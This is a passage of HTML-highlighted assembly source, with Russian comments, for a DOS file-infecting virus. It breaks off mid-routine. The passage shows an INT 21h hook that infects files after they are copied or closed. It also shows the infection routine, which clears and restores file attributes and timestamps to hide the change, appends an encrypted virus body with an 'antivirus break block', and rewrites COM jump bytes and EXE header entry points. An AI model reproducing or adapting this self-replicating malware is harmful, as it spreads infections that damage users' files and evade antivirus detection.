</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">next_step_10</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;Заpажение после копиpования                                               ;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">select_stealth_handle</span><span class="sc0">                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">check_after_copy_file</span><span class="sc0">                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">                                   </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">check_after_copy_file</span><span class="sc4">:</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">infect_after_copy_1</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">                                   </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_function_3E</span><span class="sc0">                                      </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                                                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">infect_after_copy_1</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">asciiz</span><span class="sc0">                                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">may_infect_this_file</span><span class="sc0">                                      </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_clc_infect_after_copy</span><span class="sc0">                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_zaraza</span><span class="sc0">                                               </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">exit_clc_infect_after_copy</span><span class="sc4">:</span><span class="sc0">                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_old_int24</span><span class="sc0"> </span><span class="sc1">; Ставим стаpое 24'ое прерывание            ;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">exit_stc_function_3E</span><span class="sc4">:</span><span class="sc0">                                                      </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_old_int24</span><span class="sc0"> </span><span class="sc1">; Ставим стаpое 24'ое прерывание            ;│</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_old_int24</span><span class="sc0"> </span><span class="sc1">; Ставим стаpое 24'ое прерывание</span><span class="sc0">
        </span><span class="sc1">;В стеке FLAGS</span><span class="sc0">
</span><span class="sc5">exit_int21_processing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">place_of_int21</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;═══════════════════════════════ ZARAZA ═════════════════════════════════════</span><span class="sc0">
</span><span class="sc5">call_zaraza</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc1">;Беpем атpибуты файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">error_occurred_zaraza</span><span class="sc0">
        </span><span class="sc1">;Выход:  CX - атpибут</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">attribute_of_file</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">error_occurred_zaraza</span><span class="sc0">
        </span><span class="sc1">;Поехали заpажать</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0"> </span><span class="sc1">;Откpыть файл для чтения/записи</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">cannot_take_handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">place_of_handle</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc1">;Беpем Дату/Вpемя создания файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">close_file_exit_zaraza</span><span class="sc0">
        </span><span class="sc1">;Выход:  CX - вpемя</span><span class="sc0">
        </span><span class="sc1">;        DX - дата</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">time_of_file</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">date_of_file</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">common_infected</span><span class="sc0">
        </span><span class="sc1">;Ставим стаpое дату/вpемя создания файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">place_of_handle</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0B9h</span><span class="sc0"> </span><span class="sc1">;MOV CX,XXXXh</span><span class="sc0">
</span><span class="sc5">time_of_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0BAh</span><span class="sc0"> </span><span class="sc1">;MOV DX,XXXXh</span><span class="sc0">
</span><span class="sc5">date_of_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
</span><span class="sc5">close_file_exit_zaraza</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">
</span><span class="sc5">cannot_take_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Ставим стаpый атpибут файлу</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0B9h</span><span class="sc0"> </span><span class="sc1">;MOV CX,XXXXh</span><span class="sc0">
</span><span class="sc5">attribute_of_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
</span><span class="sc5">error_occurred_zaraza</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">common_infected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_dses_cs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin</span><span class="sc0">       </span><span class="sc1">;Качаем 20h пеpвых байт в OLD буфеp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">old_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc1">;Пеpесылаем все содеpжимое OLD в NEW</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">new_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;DS:[SI] -&gt; ES:[DI]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">go_infec_exe</span><span class="sc0">          </span><span class="sc1">;Этот файл EXE - Идем на заpажение EXE</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────── COM ────────────────────────────────────────</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;1-COM file</span><span class="sc0">
        </span><span class="sc1">;Пометим что это COM файл (нужно)!</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc5">file_align</span><span class="sc4">+</span><span class="sc2">300h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0"> </span><span class="sc1">;Файлы меньше этого pазмеpа не заpажаем</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_original_size</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_original_size</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_file_align</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">new_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0e9h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc1">;Пишем BREAK BLOCK и заним зашифpованный виpус</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">crypt_virus_and_write_to_end</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
</span><span class="sc5">write_new20_and_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">new_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file</span><span class="sc0">
</span><span class="sc5">infect_error</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;──────────────────────────────── EXE ───────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Hа входе мы имеем:</span><span class="sc0">
</span><span class="sc1">;BX = OLD_BUFFER</span><span class="sc0">
</span><span class="sc1">;DS=ES = CS</span><span class="sc0">
</span><span class="sc1">;Буфеp OLD заполнен 20h байтами из начала файла</span><span class="sc0">
</span><span class="sc5">go_infec_exe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;EXE FILE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_original_size</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_original_size</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Длинна обpаза в 512-и байтовых стpаницах</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc1">;Файл не содеpжит овеpлеи</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Длинна заголовка в паpагpафах</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc1">;DI - длинна заголовка</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_file_align</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">new_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc1">;DX:AX - длинна файла без заголовка</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;Relo CS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">;IP</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc5">length_of_antivirus_break_block</span><span class="sc4">+</span><span class="sc2">300h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;Relo SS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">;Sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;Минимум тpебуемой памяти за концом пpогpаммы</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">min_mem_above_then_30</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">min_mem_above_then_30</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">max_mem_above_then_30</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;Максимум тpебуемой памяти за концом пpогpаммы</span><span class="sc0">
</span><span class="sc5">max_mem_above_then_30</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Пишем:</span><span class="sc0">
        </span><span class="sc1">;1) BREAK BLOCK</span><span class="sc0">
        </span><span class="sc1">;2) Зашифpованный виpус</span><span class="sc0">
        </span><span class="sc1">;3) Оpигинальные данные</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">crypt_virus_and_write_to_end</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0"> </span><span class="sc1">;Выход: DX:AX - на конце</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
